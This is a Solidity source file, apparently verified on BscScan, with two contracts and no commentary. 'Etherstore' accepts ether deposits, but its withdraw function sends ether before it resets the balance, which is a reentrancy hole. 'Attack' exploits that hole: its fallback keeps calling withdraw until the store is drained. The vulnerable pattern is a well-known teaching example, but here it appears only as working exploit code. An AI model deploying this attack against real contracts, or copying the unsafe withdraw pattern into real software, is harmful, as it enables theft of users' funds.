/**
 *Submitted for verification at BscScan.com on 2022-05-18
*/

//SPDX-License-Identifier:MIT
pragma solidity ^0.6.0;
contract Etherstore{
    mapping (address=>uint) public balance;
    function deposit() public payable{
        balance[msg.sender] +=msg.value;

    }
    function withdraw(uint amount) public {
        require(balance[msg.sender] >= amount);
        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent,"failed to send ether");
        balance[msg.sender] = 0;
    }
    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}
contract Attack{
    Etherstore public etherstore;
    constructor(address _etherstoreAddress) public{
        etherstore = Etherstore(_etherstoreAddress);
    }
    fallback() external payable{
        if(address(etherstore).balance>= 1 ether){
            etherstore.withdraw(1 ether);
        }
    }
    function attack() external payable{
        require(msg.value>=1 ether);
        etherstore.deposit{value: 1 ether}();
        etherstore.withdraw(1 ether);
    }
    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}